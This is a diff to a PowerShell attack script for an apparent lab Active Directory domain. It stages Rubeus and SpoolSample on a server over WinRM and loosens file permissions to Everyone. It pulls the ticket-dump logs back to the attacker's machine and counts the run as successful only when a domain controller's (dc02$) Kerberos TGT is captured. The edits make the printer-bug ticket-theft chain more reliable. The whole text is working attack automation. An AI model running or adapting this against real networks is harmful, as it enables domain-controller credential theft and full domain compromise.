@@ -23,6 +23,7 @@ $ErrorActionPreference = "Stop"
 $securePass = ConvertTo-SecureString $Password -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential("child.cadre.local\$Username", $securePass)
 
+$localDir = "C:\Tools\cadre-attack"
 $runId = (Get-Date -Format yyyyMMddHHmmss)
 $RemoteDir = Join-Path $BaseRemoteDir "T102-$runId"
 
@@ -42,7 +43,7 @@ try {
     Copy-Item -Path $srcRubeus -Destination $remoteRubeus -ToSession $sess -Force
     Copy-Item -Path $srcSpool -Destination $remoteSpool -ToSession $sess -Force
     Invoke-Command -Session $sess -ScriptBlock { param($p1,$p2) icacls $p1 /grant "Everyone:(RX)" | Out-Null; icacls $p2 /grant "Everyone:(RX)" | Out-Null } -ArgumentList $remoteRubeus,$remoteSpool
-    Write-Output "T102_OK: STAGED Rubeus -> $remoteRubeus, SpoolSample -> $remoteSpool"
+    Write-Output "T102_STAGED: Rubeus -> $remoteRubeus, SpoolSample -> $remoteSpool"
 } finally {
     Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
 }
@@ -91,7 +92,7 @@ $sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorA
 try {
     Invoke-Command -Session $sess -ScriptBlock { param($p, $c) Set-Content -Path $p -Value $c -Encoding ASCII -Force } -ArgumentList $remoteScriptPath, $remoteScript
     Invoke-Command -Session $sess -ScriptBlock { param($p) icacls $p /grant "Everyone:(RX)" | Out-Null } -ArgumentList $remoteScriptPath
-    Write-Output "T102_OK: WROTE remote script -> $remoteScriptPath"
+    Write-Output "T102_STAGED: WROTE remote script -> $remoteScriptPath"
 } finally {
     Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
 }
@@ -103,17 +104,25 @@ Start-Sleep -Seconds 5
 
 $sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
 try {
-    Invoke-Command -Session $sess -ScriptBlock { param($p1,$p2) if (Test-Path $p1) { icacls $p1 /grant "Everyone:(R)" | Out-Null }; if (Test-Path $p2) { icacls $p2 /grant "Everyone:(R)" | Out-Null } } -ArgumentList $spoolOut,$dumpOut
+    Invoke-Command -Session $sess -ScriptBlock {
+        param($p1,$p2)
+        foreach ($p in @($p1,$p2)) {
+            if (-not [string]::IsNullOrWhiteSpace($p) -and (Test-Path -LiteralPath $p -ErrorAction SilentlyContinue)) {
+                icacls $p /grant "Everyone:(R)" | Out-Null
+            }
+        }
+    } -ArgumentList $spoolOut,$dumpOut
     $localDir = "C:\Tools\cadre-attack"
     if (-not (Test-Path $localDir)) { New-Item -ItemType Directory -Path $localDir -Force | Out-Null }
-    if (Test-Path $spoolOut) { Copy-Item -Path $spoolOut -Destination "$localDir\T102-spoolsample-$runId.txt" -FromSession $sess -Force }
-    if (Test-Path $dumpOut) { Copy-Item -Path $dumpOut -Destination "$localDir\T102-rubeus-dump-$runId.txt" -FromSession $sess -Force }
-    Write-Output "T102_OK: PULLED spool/dump logs to $localDir"
+    if (Test-Path -LiteralPath $spoolOut -ErrorAction SilentlyContinue) { Copy-Item -Path $spoolOut -Destination "$localDir\T102-spoolsample-$runId.txt" -FromSession $sess -Force -ErrorAction SilentlyContinue }
+    if (Test-Path -LiteralPath $dumpOut -ErrorAction SilentlyContinue) { Copy-Item -Path $dumpOut -Destination "$localDir\T102-rubeus-dump-$runId.txt" -FromSession $sess -Force -ErrorAction SilentlyContinue }
+    Write-Output "T102_STAGED: PULLED spool/dump logs to $localDir"
 } finally {
     Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
 }
 
 $localDump = "$localDir\T102-rubeus-dump-$runId.txt"
+$kirbiLines = $null
 if (Test-Path $localDump) {
     Write-Output "=== T102 Rubeus dump output (first 100 lines) ==="
     Get-Content $localDump -ErrorAction SilentlyContinue | Select-Object -First 100
@@ -127,4 +136,10 @@ if (Test-Path $localDump) {
     }
 } else {
     Write-Output "T102_INFO: No dump output captured"
+}
+if ($kirbiLines) {
+    Write-Output "T102_OK"
+} else {
+    Write-Output "T102_FAIL: no dc02$ TGT captured (KIRBI empty)"
+    exit 1
 }
